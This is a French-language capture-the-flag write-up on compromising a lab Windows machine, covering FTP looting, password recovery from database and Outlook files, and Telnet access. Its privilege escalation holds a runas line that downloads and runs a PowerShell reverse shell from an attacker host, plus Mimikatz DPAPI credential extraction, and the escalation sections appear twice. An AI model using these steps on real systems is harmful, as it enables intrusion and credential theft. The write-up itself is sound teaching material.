![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

L'objectif de cette phase est d'identifier la surface d'attaque d'une machine Windows dont la configuration semble atypique pour cet OS (absence de ports SMB/RPC standards). L'attaque repose sur une chaîne d'extraction de données à partir de services mal sécurisés.

#### Énumération des Services (Scanning)

Je débute par un scan **Nmap** complet pour identifier les ports ouverts, suivi d'une énumération des services et des scripts par défaut.

```bash
# Scan rapide de tous les ports TCP
nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.98

# Scan de version et scripts par défaut sur les ports identifiés
nmap -sC -sV -p 21,23,80 -oA nmap/scripts 10.10.10.98
```

**Résultats du scan :**
*   **Port 21 (FTP) :** Microsoft ftpd. L'accès **Anonymous FTP** est activé.
*   **Port 23 (Telnet) :** Microsoft Telnet Service.
*   **Port 80 (HTTP) :** Microsoft IIS 7.5.

L'absence des ports 135, 139 et 445 suggère une machine Windows durcie ou configurée pour un rôle spécifique (système de contrôle d'accès, comme le nom de la machine l'indique).

#### Exploration du vecteur HTTP

Le serveur web affiche une image statique. Un scan de répertoires avec **Gobuster** ne révèle aucun point d'entrée exploitable.

```bash
gobuster dir -u http://10.10.10.98 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x asp,aspx,txt
```

#### Extraction de données via FTP Anonymous

Le service **FTP** permet une connexion anonyme. J'explore l'arborescence et identifie deux répertoires : `Backups` et `Engineer`.

```bash
ftp 10.10.10.98
# Connexion en tant qu'utilisateur 'anonymous'
# Récupération des fichiers
get "Backups/backup.mdb"
get "Engineer/Access Control.zip"
```

Je récupère une base de données **Microsoft Access** (`.mdb`) et une archive **ZIP** protégée par mot de passe.

> **Schéma Mental : La Chaîne de Confiance**
> L'accès **Anonymous FTP** est le premier maillon. Il fournit des artefacts (DB et ZIP) qui, bien que protégés ou illisibles directement, contiennent les secrets nécessaires pour pivoter vers l'accès système. La logique est : **FTP -> MDB (Credentials) -> ZIP (PST) -> PST (Email) -> Telnet (Shell)**.

#### Analyse de la base de données (MDB)

Pour analyser le fichier `backup.mdb` sous Linux, j'utilise la suite **mdbtools**. L'objectif est d'énumérer les tables et d'extraire des informations d'authentification.

```bash
# Lister les tables de la base de données
mdb-tables backup.mdb

# Script rapide pour identifier les tables contenant des données
for table in $(mdb-tables backup.mdb); do 
    count=$(mdb-export backup.mdb $table | wc -l); 
    if [ $count -gt 1 ]; then echo "$table: $count"; fi; 
done
```

La table `auth_user` contient des informations critiques :

```bash
mdb-export backup.mdb auth_user
# Résultat :
# 27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
```

Le mot de passe identifié est **access4u@security**.

#### Pivot vers le fichier PST (Outlook)

L'archive `Access Control.zip` contient un fichier `Access Control.pst`. Je tente de la décompresser en utilisant le mot de passe trouvé précédemment.

```bash
7z x "Access Control.zip" -p'access4u@security'
```

Le fichier **PST** est un format de stockage d'emails Outlook. Pour le lire, je le convertis au format **mbox** (plain text) avec l'outil **readpst**.

```bash
# Conversion du PST
readpst "Access Control.pst"

# Lecture du fichier mbox résultant
cat "Access Control.mbox"
```

L'email extrait contient le message suivant :
*"The password for the “security” account has been changed to **4Cc3ssC0ntr0ller**."*

#### Accès Initial via Telnet

Avec les credentials de l'utilisateur `security`, je tente une connexion via le service **Telnet** identifié lors du scan initial.

```bash
telnet 10.10.10.98
# Login: security
# Password: 4Cc3ssC0ntr0ller
```

La connexion est réussie. Je dispose désormais d'un **Shell** interactif avec les privilèges de l'utilisateur `security`.

```cmd
C:\Users\security> whoami
access\security

C:\Users\security\Desktop> type user.txt
```

---

### Énumération Post-Exploitation & Découverte de Secrets

Une fois l'accès initial obtenu avec le compte **security**, l'objectif est d'identifier des vecteurs d'élévation de privilèges. Sur Windows, l'énumération des raccourcis (**LNK files**) et des informations d'identification stockées est cruciale.

L'examen du bureau public révèle un fichier suspect : `C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk`.

```powershell
# Lecture brute du fichier LNK pour identifier des commandes masquées
type "C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk"
```

L'analyse des chaînes de caractères montre l'utilisation de **runas.exe** avec le flag `/savecred`. Cela indique que le mot de passe de l'administrateur a été enregistré précédemment dans le **Windows Credential Manager**.

Pour confirmer la présence de **Cached Credentials**, j'utilise la commande suivante :

```cmd
# Lister les informations d'identification enregistrées
cmdkey /list
```

> **Schéma Mental :** L'attaquant identifie une mauvaise configuration de **runas /savecred**. Si un administrateur a utilisé cette commande une fois, le système stocke le secret de manière persistante. Tout utilisateur ayant accès à la machine peut alors réutiliser ces **Stored Credentials** pour exécuter n'importe quel binaire avec les privilèges de l'administrateur sans connaître son mot de passe.

---

### Escalade de Privilèges : Méthode 1 (Abus de runas)

La méthode la plus directe consiste à invoquer un **Reverse Shell** via PowerShell en utilisant les privilèges mis en cache.

**Préparation de l'attaque (Machine Attaquant) :**
J'utilise le script `Invoke-PowerShellTcp.ps1` de la suite **Nishang**.

```bash
# Ajout de l'appel de fonction à la fin du script pour exécution automatique
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443" >> shell.ps1

# Lancement du serveur HTTP et du listener
python3 -m http.server 80
nc -lnvp 443
```

**Exécution (Machine Cible) :**
J'exécute la commande via **runas** pour déclencher le callback en tant qu'**Administrator**.

```cmd
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')"
```

---

### Escalade de Privilèges : Méthode 2 (Extraction DPAPI via Mimikatz)

Pour une approche plus furtive ou hors-ligne, il est possible d'extraire les secrets du **Credential Manager** protégés par **DPAPI (Data Protection API)**.

#### 1. Collecte des artefacts
Il faut récupérer le **Master Key** et le fichier de **Credentials**.

```cmd
# Localisation du Master Key (nom de dossier GUID)
dir /a C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-...

# Encodage en Base64 pour exfiltration simple via le terminal
certutil -encode <FILE> output.txt
```

#### 2. Déchiffrement avec Mimikatz
Une fois les fichiers rapatriés, j'utilise **Mimikatz** pour remonter la chaîne de confiance.

> **Schéma Mental :** DPAPI protège les secrets utilisateur. Le **Credential File** est chiffré par une **Master Key**, elle-même chiffrée par le mot de passe de l'utilisateur (ou son SID). En possédant le mot de passe de l'utilisateur actuel (`security`), on peut déverrouiller la **Master Key** pour lire les secrets d'autres comptes stockés sur le système.

```mimikatz
# 1. Déchiffrer la Master Key avec le mot de passe de l'utilisateur actuel
dpapi::masterkey /in:masterkey /sid:S-1-5-21-... /password:4Cc3ssC0ntr0ller

# 2. Déchiffrer le fichier de credentials pour obtenir le mot de passe clair
dpapi::cred /in:credentials
```

**Résultat :** L'extraction révèle le mot de passe de l'administrateur : `55Acc3ssS3cur1ty@megacorp`.

---

### Mouvement Latéral & Accès Final

Avec le mot de passe clair de l'**Administrator**, l'accès complet est validé via **Telnet**, permettant de récupérer le flag `root.txt`.

```bash
telnet 10.10.10.98
# Login: administrator
# Pass: 55Acc3ssS3cur1ty@megacorp

whoami
# access\administrator
```

### Analyse approfondie (Beyond Root) : Analyse de fichiers LNK
Pour automatiser l'analyse de raccourcis sans interface graphique, l'utilisation de **PowerShell COM Objects** est la méthode privilégiée en post-exploitation :

```powershell
$WScript = New-Object -ComObject WScript.Shell
$Lnk = Get-ChildItem C:\Users\Public\Desktop\*.lnk
$WScript.CreateShortcut($Lnk) | Select-Object TargetPath, Arguments, WorkingDirectory
```

---

### Énumération pour l'Élévation de Privilèges

Une fois le shell obtenu en tant que `access\security`, ma priorité est d'identifier des vecteurs de mouvement latéral ou d'escalade. Sur une machine Windows, l'un des premiers réflexes est de vérifier la présence de **Stored Credentials**.

L'exécution de la commande `cmdkey` révèle une information critique :

```cmd
cmdkey /list
```

Le résultat confirme que des **Cached Credentials** sont présents pour le compte `ACCESS\Administrator`. Parallèlement, l'examen du répertoire `C:\Users\Public\Desktop` montre un fichier **Shortcut** (`.lnk`) nommé `ZKAccess3.5 Security System.lnk`. L'analyse des chaînes de caractères de ce binaire via `type` expose la commande sous-jacente :

```cmd
C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"
```

> **Schéma Mental :** L'utilisation de **runas.exe** avec le flag **/savecred** indique que le mot de passe de l'administrateur a été enregistré dans le **Windows Credential Manager**. Contrairement à un `runas` classique, le système ne demandera pas de mot de passe à l'exécution car il utilisera le secret stocké dans le **LSA (Local Security Authority)**. En tant qu'utilisateur `security`, je peux invoquer n'importe quel binaire sous l'identité `Administrator` en détournant cet usage.

---

### Vecteur 1 : Exploitation directe via Runas & Reverse Shell

La méthode la plus rapide consiste à utiliser **runas** pour exécuter une instance **PowerShell** qui chargera un **Reverse Shell** en mémoire. J'utilise le script `Invoke-PowerShellTcp.ps1` de la suite **Nishang**.

1.  **Préparation sur la machine attaquante :**
    Ajout de l'appel de fonction à la fin du script et lancement d'un serveur HTTP.
    ```bash
    echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443" >> shell.ps1
    python3 -m http.server 80
    ```

2.  **Exécution sur la cible :**
    J'utilise `runas` pour forcer l'exécution du payload via les identifiants mis en cache.
    ```cmd
    runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.14.11/shell.ps1')"
    ```

Une connexion entrante est reçue sur mon listener `nc -lnvp 443`, m'octroyant un shell avec les privilèges `access\administrator`.

---

### Vecteur 2 : Extraction des secrets via DPAPI (Méthode Avancée)

Si l'exécution directe n'était pas possible, j'aurais pu extraire physiquement les secrets via l'API **DPAPI (Data Protection API)**. Cette méthode permet de récupérer le mot de passe en clair stocké par Windows.

1.  **Récupération des fichiers nécessaires :**
    *   Le **Master Key** (situé dans `AppData\Roaming\Microsoft\Protect\{SID}`).
    *   Le fichier de **Credentials** (situé dans `AppData\Roaming\Microsoft\Credentials`).

2.  **Exfiltration et Décodage :**
    Utilisation de `certutil -encode` pour transférer les binaires en Base64 via le terminal Telnet.

3.  **Déchiffrement avec Mimikatz :**
    Sur une machine Windows de contrôle, j'utilise **Mimikatz** pour dériver la clé maître avec le mot de passe de l'utilisateur `security` (obtenu en Phase 2), puis je déchiffre le blob de credentials.

```mimikatz
# 1. Déchiffrer la Master Key
dpapi::masterkey /in:masterkey /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller

# 2. Déchiffrer le Credential Blob
dpapi::cred /in:credentials
```

Le champ `CredentialBlob` révèle le mot de passe en clair de l'administrateur : `55Acc3ssS3cur1ty@megacorp`.

---

### Domination Totale

Avec le mot de passe administrateur, la compromission est totale. Je peux me reconnecter via **Telnet** ou utiliser `psexec` pour une persistance accrue.

```bash
telnet 10.10.10.98
# Login: administrator / 55Acc3ssS3cur1ty@megacorp
type C:\Users\Administrator\Desktop\root.txt
```

---

### Beyond Root : Analyse Post-Exploitation des fichiers .lnk

L'analyse de fichiers **Shortcut** (`.lnk`) est souvent négligée mais cruciale pour comprendre les vecteurs d'attaque par **User Interaction** ou les mauvaises configurations de scripts d'administration.

**Analyse via PowerShell :**
Il est possible d'inspecter les propriétés d'un raccourci sans outils tiers en utilisant l'objet **COM** `WScript.Shell`. Cela permet d'extraire proprement les arguments de la ligne de commande, souvent tronqués lors d'un simple `type` ou `strings`.

```powershell
$WScript = New-Object -ComObject WScript.Shell
$Shortcut = $WScript.CreateShortcut("C:\Users\Public\Desktop\ZKAccess3.5 Security System.lnk")
$Shortcut | Select-Object FullName, TargetPath, Arguments, WorkingDirectory
```

**Analyse Offline via pylnker :**
Sur une machine Linux, l'outil **pylnker.py** permet de parser la structure binaire du fichier pour extraire des métadonnées supplémentaires comme les **MAC Times** (Creation, Access, Modified) et le **Volume Serial Number**, ce qui est précieux lors d'une investigation de type **Forensics** pour tracer l'origine d'un déploiement de logiciel ou d'un script malveillant.